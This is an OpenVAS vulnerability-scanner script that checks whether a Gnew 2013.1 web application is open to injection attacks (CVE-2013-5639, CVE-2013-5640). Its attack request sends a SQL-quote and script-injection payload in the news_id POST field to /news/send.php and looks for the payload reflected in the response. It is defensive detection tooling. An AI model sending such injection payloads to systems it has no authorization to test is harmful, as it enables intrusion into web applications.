###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_gnew_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Gnew Multiple Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804110";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-5639","CVE-2013-5640");
  script_bugtraq_id(62817,62818);
  script_tag(name:"cvss_base", value:"7.6");
  script_tag(name:"cvss_base_vetor", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-10-17 14:49:54 +0530 (Thu, 17 Oct 2013)");
  script_name("Gnew Multiple Vulnerabilities");

  tag_summary =
"This host is running Gnew and is prone to multiple vulnerabilities";

  tag_vuldetect =
"Send a crafted exploit string via HTTP POST request and check whether it
is able to read the string or not.";

  tag_insight =
"Multiple flaws in Gnew exists due to,
- Insufficient filtration of friend_email HTTP POST parameter passed to
  /news/send.php script.
- Insufficient validation of user-supplied input passed via the 'gnew_language'
  cookie to /users/login.php script.
- Insufficient filtration of user_email HTTP POST parameter passed to
  /users/register.php script.";

  tag_impact =
"Successful exploitation will allow remote attackers to execute arbitrary
PHP code and perform SQL injection attacks.

Impact Level: Application";

  tag_affected =
"Gnew version 2013.1, Other versions may also be affected.";

  tag_solution =
"No solution available as of October 16, 2013. Information regarding this
issue will be updated once the solution details are available.
For updates refer to http://www.gnew.fr";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://secunia.com/advisories/54466");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Oct/7");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/28684");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/123482");
  script_summary("Check if Gnew is vulnerable to arbitrary PHP code and SQL injection attacks");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable initialization
dir = "";
req = "";
res = "";
host = "";
port = 0;
postdata = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port) port = 80;

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("", "/gnew", "/cms", cgi_dirs()))
{
  ## Confirm the application before trying exploit
  if(http_vuln_check(port:port, url: dir + "/news/index.php",
                     check_header: TRUE, pattern:">Gnew<"))
  {
    ## Construct attack request
    postdata = "send=1&user_name=username&user_email=a%40b.com&friend_email=c@d.com&news_id=-1'" +
               "<script>alert(document.cookie);</script>";

    req = string("POST ", dir, "/news/send.php HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n\r\n",
                  postdata);

    ## Send request and receive the response
    res = http_keepalive_send_recv(port:port, data:req);

    ## Confirm exploit worked by checking the response
    if(res && "<script>alert(document.cookie);</script>" >< res)
    {
      security_hole(port);
      exit(0);
    }
  }
}
